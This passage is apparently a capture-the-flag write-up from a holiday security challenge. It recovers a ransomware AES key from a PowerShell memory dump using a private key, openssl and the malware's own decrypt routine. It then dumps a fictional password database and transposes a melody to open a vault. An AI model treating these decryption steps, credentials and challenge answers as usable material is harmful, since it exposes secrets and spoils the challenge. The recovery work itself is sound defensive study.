uGmaIcj6Nzdzr+7EBOWZumjy5WWPrSe0S6Ld4lTcFdaXolUEHkE0E0j7H8M+dKG2
Emz3zaJNiAIX89UcvelrXTV00k+kMYItvHWchdiH64EOjsWrc8co9WNgK1XlLQtG
4iBpErVctbOcjJlzv1zXgUiyTQKBgQDaxRoQolzgjElDG/T3VsC81jO6jdatRpXB
0URM8/4MB/vRAL8LB834ZKhnSNyzgh9N5G9/TAB9qJJ+4RYlUUOVIhK+8t863498
/P4sKNlPQio4Ld3lfnT92xpZU1hYfyRPQ29rcim2c173KDMPcO6gXTezDCa1h64Q
8iskC4iSwQKBgQCvwq3f40HyqNE9YVRlmRhryUI1qBli+qP5ftySHhqy94okwerE
KcHw3VaJVM9J17Atk4m1aL+v3Fh01OH5qh9JSwitRDKFZ74JV0Ka4QNHoqtnCsc4
eP1RgCE5z0w0efyrybH9pXwrNTNSEJi7tXmbk8azcdIw5GsqQKeNs6qBSQKBgH1v
sC9DeS+DIGqrN/0tr9tWklhwBVxa8XktDRV2fP7XAQroe6HOesnmpSx7eZgvjtVx
moCJympCYqT/WFxTSQXUgJ0d0uMF1lcbFH2relZYoK6PlgCFTn1TyLrY7/nmBKKy
DsuzrLkhU50xXn2HCjvG1y4BVJyXTDYJNLU5K7jBAoGBAMMxIo7+9otN8hWxnqe4
Ie0RAqOWkBvZPQ7mEDeRC5hRhfCjn9w6G+2+/7dGlKiOTC3Qn3wz8QoG4v5xAqXE
JKBn972KvO0eQ5niYehG4yBaImHH+h6NVBlFd0GJ5VhzaBJyoOk+KnOnvVYbrGBq
UdrzXvSwyFuuIqBlkHnWSIeC
-----END PRIVATE KEY-----
```

Found it!! Let's save it as `server.key` and downlad the public key as well:
```
$(g_o_dns (A2H "server.crt"))
MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF
MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
CgKCAQEAxIjc2VVG1wmzBi+LDNlLYpUeLHhGZYtgjKAye96h6pfrUqcLSvcuC+s5
ywy1kgOrrx/pZh4YXqfbolt77x2AqvjGuRJYwa78EMtHtgq/6njQa3TLULPSpMTC
QM9H0SWF77VgDRSReQPjaoyPo3TFbS/Pj1ThlqdTwPA0lu4vvXi5Kj2zQ8QnxYQB
hpRxFPnB9Ak6G9EgeR5NEkz1CiiVXN37A/P7etMiU4QsOBipEcBvL6nEAoABlUHi
zWCTBBb9PlhwLdlsY1k7tx5wHzD7IhJ5P8tdksBzgrWjYxUfBreddg+4nRVVuKeb
E9Jq6zImCfu8elXjCJK8OLZP9WZWDQIDAQABo1AwTjAdBgNVHQ4EFgQUfeOgZ4f+
kxU1/BN/PpHRuzBYzdEwHwYDVR0jBBgwFoAUfeOgZ4f+kxU1/BN/PpHRuzBYzdEw
DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAhdhDHQvW9Q+Fromk7n2G
2eXkTNX1bxz2PS2Q1ZW393Z83aBRWRvQKt/qGCAi9AHg+NB/F0WMZfuuLgziJQTH
QS+vvCn3bi1HCwz9w7PFe5CZegaivbaRD0h7V9RHwVfzCGSddUEGBH3j8q7thrKO
xOmEwvHi/0ar+0sscBideOGq11hoTn74I+gHjRherRvQWJb4Abfdr4kUnAsdxsl7
MTxM0f4t4cdWHyeJUH3yBuT6euId9rn7GQNi61HjChXjEfza8hpBC4OurCKcfQiV
oY/0BxXdxgTygwhAdWmvNrHPoQyB5Q9XwgN/wWMtrlPZfy3AW9uGFj/sgJv42xcF
+w==
```
Save this as `server.crt`, remember to add `-----BEGIN CERTIFICATE-----` and `-----END CERTIFICATE-----` as header and footer.

We need to "know" `$p_k_e_k` better:

```
$p_k_e_k = (p_k_e $b_k $p_k).ToString();
```

The value returned from `p_k_e`:
```
return $(B2H $encKey) 
```

So `$p_k_e_k` is an hex string which we need to:
- find into the memory dump
- convert into binary format
- decrypt with `server.key`
- the resulting binary will be our `$b_k` AES key for file decryption

Inside wanc, let's add a debug write and a return just after the creation of `$p_k_e_k`:

```
$p_k_e_k = (p_k_e $b_k $p_k).ToString();
write-host "Encrypted AES key length: " $p_k_e_k.length
return
```

We call `wanc` and:

```
Encrypted AES key length:  512
```

Time to launch `power_dump`:

```
# ./power_dump
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 1

============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================

============================================
: ld powershell.exe_181109_104716.dmp
============ Load Dump Menu ================
COMMAND |     ARGUMENT       | Explanation
========|====================|==============
ld      | /path/to/file.name | load mem dump
ls      | ../directory/path  | list files
B       |                    | back to menu
============= Loaded File: =================
powershell.exe_181109_104716.dmp 427762187
============================================
: b
```

Power Dump needs to process the file before allowing us to search (it could take a while):

```
============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : False
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 2
[i] Please wait, processing memory dump...
[+] Found 65 script blocks!
[+] Found some Powershell variable names to work with...
[+] Found 10947 possible variables stored in memory
Successfully Processed Memory Dump!
```

We are looking for PS variables with lenght of 512:
```
============ Main Menu ================
Memory Dump: powershell.exe_181109_104716.dmp
Loaded     : True
Processed  : True
=======================================
1. Load PowerShell Memory Dump File
2. Process PowerShell Memory Dump
3. Search/Dump Powershell Scripts
4. Search/Dump Stored PS Variables
e. Exit
: 4

[i] 10947 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
: len == 512

================ Filters ================
1| LENGTH  len(variable_values) == 512

[i] 1 powershell Variable Values found!
============== Search/Dump PS Variable Values ===================================
COMMAND        |     ARGUMENT                | Explanation
===============|=============================|=================================
print          | print [all|num]             | print specific or all Variables
dump           | dump [all|num]              | dump specific or all Variables
contains       | contains [ascii_string]     | Variable Values must contain string
matches        | matches "[python_regex]"    | match python regex inside quotes
len            | len [>|<|>=|<=|==] [bt_size]| Variables length >,<,=,>=,<= size
clear          | clear [all|num]             | clear all or specific filter num
===============================================================================
```

Well `[i] 1 powershell Variable Values found!`: we don't need any other filter, we have the infected client's `$p_k_e_k` and we're saving it:
```
: dump
[+] saved variables to powershell_var_script_dump/variable_values.txt
```

Decryption time! We'll convert the dumped hex string into the binary value, decrypt it and convert it again in hex (just to copy/paste)

```
xxd -r -p  powershell_var_script_dump/variable_values.txt aes_key_encrypted.bin

openssl pkeyutl -decrypt -inkey server.key -pkeyopt rsa_padding_mode:oaep -in aes_key_encrypted.bin  | xxd -p > aes_key_hex.txt

cat aes_key_hex.txt
fbcfc121915d99cc20a3d3d5d84f8308
```

Now we can use the malware's decryption function to recover our file:
```
$h_k = "fbcfc121915d99cc20a3d3d5d84f8308"
$b_k = $(h2b $h_k)

e_d_file $b_k "c:\somwhere\alabaster_passwords.elfdb.wannacookie"  $false
```

And we have decrypted the DB! Which kind of db?
```
# file alabaster_passwords.elfdb
alabaster_passwords.elfdb: SQLite 3.x database
```

It's SQlite, I have a docker image ready to dump it:
```
# docker run -it -v /path/to/kringlecon/dir:/root/db nouchka/sqlite3
SQLite version 3.8.7.1 2014-10-29 13:59:56
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.

sqlite> .open alabaster_passwords.elfdb

sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE "passwords" (
        `name`  TEXT NOT NULL,
        `password`      TEXT NOT NULL,
        `usedfor`       TEXT NOT NULL
);
INSERT INTO "passwords" VALUES('alabaster.snowball','CookiesR0cK!2!#','active directory');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','KeepYourEnemiesClose1425','www.toysrus.com');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','CookiesRLyfe!*26','netflix.com');
INSERT INTO "passwords" VALUES('alabaster.snowball','MoarCookiesPreeze1928','Barcode Scanner');
INSERT INTO "passwords" VALUES('alabaster.snowball','ED#ED#EED#EF#G#F#G#ABA#BA#B','vault');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','PetsEatCookiesTOo@813','neopets.com');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','YayImACoder1926','www.codecademy.com');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','Woootz4Cookies19273','www.4chan.org');
INSERT INTO "passwords" VALUES('alabaster@kringlecastle.com','ChristMasRox19283','www.reddit.com');
COMMIT;
```

**Objective answer**: `ED#ED#EED#EF#G#F#G#ABA#BA#B`


#### Question 13 - Unlock the vault

> You have some serious skills, of that I have no doubt.
> There is just one more task I need you to help with.
> There is a [door](https://pianolockn.kringlecastle.com/) which leads to Santa's vault. To unlock the door, you need to play a melody.

>Use what you have learned from previous challenges to open the door to Santa's vault. What message do you get when you unlock the door?


The [door](https://pianolockn.kringlecastle.com/) lock is actually a piano keyboard... the last password was obviously a series of notes, so we'll insert it! And we get a message which says **"Now that's a good tune! But the key isn't quite right!"**

We need to play the melody, but tuned to another key... we can use as reference the file `attach_from_Holly_Evergreen.pdf`: but we need to know the current key and the wanted key.

The current key could be guessed by the image name used for the "off key message" `https://pianolockn.kringlecastle.com/images/key-of-e-banner.png`: E key

Which is the key we need to transpose to? Let's remember what Holly mailed to Alabaster:
```
Hey alabaster, 

Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D.
```

I am not musically savvy, so I'll use http://www.logue.net/xp/index.htm to transpose `ED#ED#EED#EF#G#F#G#ABA#BA#B`:

Transposed: `D C# D C# D D C# D E  F# E  F# G A G# A G# A`

Play it to unlock the vault!


**Objective answer**: `You have unlocked Santa's vault!`


